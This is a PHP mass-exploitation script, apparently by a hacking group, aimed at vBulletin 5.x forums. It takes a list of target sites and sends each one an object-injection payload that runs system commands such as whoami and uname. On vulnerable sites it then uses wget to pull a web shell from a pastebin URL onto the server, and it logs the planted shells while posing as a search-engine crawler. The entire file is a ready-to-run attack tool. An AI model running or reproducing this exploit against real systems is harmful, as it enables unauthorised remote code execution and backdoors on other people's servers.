<?php

error_reporting(0);
set_time_limit(0);

print "
       ______        _ _              _          ______ _______ _______ 
      (____  \      | | |         _  (_)        (_____ (_______|_______)
 _   _ ____)  )_   _| | | _____ _| |_ _ ____     _____) )       _____   
| | | |  __  (| | | | | || ___ (_   _) |  _ \   |  __  / |     |  ___)  
 \ V /| |__)  ) |_| | | || ____| | |_| | | | |  | |  \ \ |_____| |_____ 
  \_/ |______/|____/ \_)_)_____)  \__)_|_| |_|  |_|   |_\______)_______) 5.X
  
                            Thx to: Mr.MaGnoM
   VBULLETIN 5.X RCE UPLOAD SHELL MASS EXPLOITING by 4WSec - Anon Cyber Team
                                                                        
";

//echo "\n\t"."usage: php $argv[0] target.txt"."\n\n";


$m=file_get_contents($argv[1]);
$e=explode("\r\n",$m);
$open=fopen("result.html","a+");

foreach ($e as $link){
   echo "\n  --=[ Scanning ==> ".$link."\n";
   check($link);
}
function inf($ur){
  $expt2='/ajax/api/hook/decodeArguments?arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:50:"whoami;echo%20:::;id;echo%20:::;uname%20-a;echo%20:::;pwd;";}';
  //$urlsk="$url/ajax/api/hook/decodeArguments?";
  $urls2=($ur).($expt2);
     $ch = curl_init();
  curl_setopt ($ch, CURLOPT_URL, "$urls2");
  curl_setopt ($ch, CURLOPT_USERAGENT, "msnbot/1.0 (+http://search.msn.com/msnbot.htm)");
  curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
  $data = curl_exec($ch);
  curl_close($ch);
  $sd=explode(":::\n",$data);
  echo "\t --=[ whoami :$sd[0]";
  echo "\t --=[ id     :$sd[1]";
  echo "\t --=[ uname  :$sd[2]";
  echo "\t --=[ pwd    :$sd[3]";
}

function shell($url){
  global $open;
  $expt='/ajax/api/hook/decodeArguments?arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:57:"wget%20http://pastebin.com/raw.php?i=TFnqyFzk%20-O%204wsec.php";}';
  //$urlsk="$url/ajax/api/hook/decodeArguments?";
  $urls=($url).($expt);
     $ch = curl_init();
  curl_setopt ($ch, CURLOPT_URL, "$urls");
  curl_setopt ($ch, CURLOPT_USERAGENT, "msnbot/1.0 (+http://search.msn.com/msnbot.htm)");
  curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
  $data = curl_exec($ch);
  curl_close($ch);
  $sf="$url/4wsec.php";
  $geg=@file_get_contents($sf);
  if(eregi("4wsec",$geg)){
    echo "\t --=[ Upload Shell: Sukses -> $url/4wsec.php \n";fwrite($open,"$url/4wsec.php?im=4wsec<br>");
  }else{
    echo "\t --=[ Shell: Gagal Upload Asw \n";
  }

}
function check($url){
  $expt='/ajax/api/hook/decodeArguments?arguments=O:12:%22vB_dB_Result%22:2:{s:5:%22%00*%00db%22;O:11:%22vB_Database%22:1:{s:9:%22functions%22;a:1:{s:11:%22free_result%22;s:6:%22system%22;}}s:12:%22%00*%00recordset%22;s:11:%22echo%204wsec%22;}';
  //$urlsk="$url/ajax/api/hook/decodeArguments?";
  $urls=($url).($expt);
     $ch = curl_init();
  curl_setopt ($ch, CURLOPT_URL, "$urls");
  curl_setopt ($ch, CURLOPT_USERAGENT, "msnbot/1.0 (+http://search.msn.com/msnbot.htm)");
  curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
  $data = curl_exec($ch);
  curl_close($ch);
  /*
  echo "\n";
  print $data;
  echo "\n";
  */
  if (preg_match("#4wsec#",$data) and strlen($data)<50){
    echo "\t--=[ Vuln: Yoi \n";
    inf($url);
    shell($url);
  }else{
    echo "\t--=[ Vuln: Kaga \n";
  }
}
fclose($open);
?>
